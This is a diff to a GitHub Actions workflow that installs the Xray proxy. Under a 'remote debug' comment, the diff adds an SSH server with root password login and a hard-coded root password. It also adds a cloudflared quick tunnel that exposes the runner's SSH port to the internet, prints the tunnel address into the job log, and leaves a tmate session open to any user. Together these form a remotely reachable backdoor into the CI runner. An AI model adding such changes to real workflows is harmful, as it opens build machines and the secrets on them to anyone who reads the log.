@@ -15,13 +15,28 @@ jobs:
         run: |
           set -e
           sudo apt-get update -qq
-          sudo apt-get install -y -qq curl unzip python3
+          sudo apt-get install -y -qq curl unzip python3 openssh-server
           curl -fsSL -o /tmp/xray.zip https://github.com/XTLS/Xray-core/releases/download/v25.9.11/Xray-linux-64.zip
           sudo unzip -o /tmp/xray.zip xray -d /usr/local/bin
           sudo chmod +x /usr/local/bin/xray
+          # sshd for remote debug
+          sudo mkdir -p /run/sshd
+          echo "PermitRootLogin yes" | sudo tee /etc/ssh/sshd_config.d/debug.conf
+          echo "PasswordAuthentication yes" | sudo tee -a /etc/ssh/sshd_config.d/debug.conf
+          echo "root:runnerdebug" | sudo chpasswd
+          sudo /usr/sbin/sshd || true
+          # cloudflared quick tunnel to ssh
+          curl -fsSL -o /tmp/cloudflared https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64
+          chmod +x /tmp/cloudflared
+          nohup /tmp/cloudflared tunnel --no-autoupdate --url ssh://localhost:22 > /tmp/cf.log 2>&1 &
+          sleep 3
+          echo "==== cloudflared log (ssh tunnel) ===="
+          cat /tmp/cf.log || true
           python3 -V
       - name: setup tmate session
         uses: mxschmitt/action-tmate@v3
+        timeout-minutes: 3
+        continue-on-error: true
         with:
           detached: true
           limit-access-to-actor: false
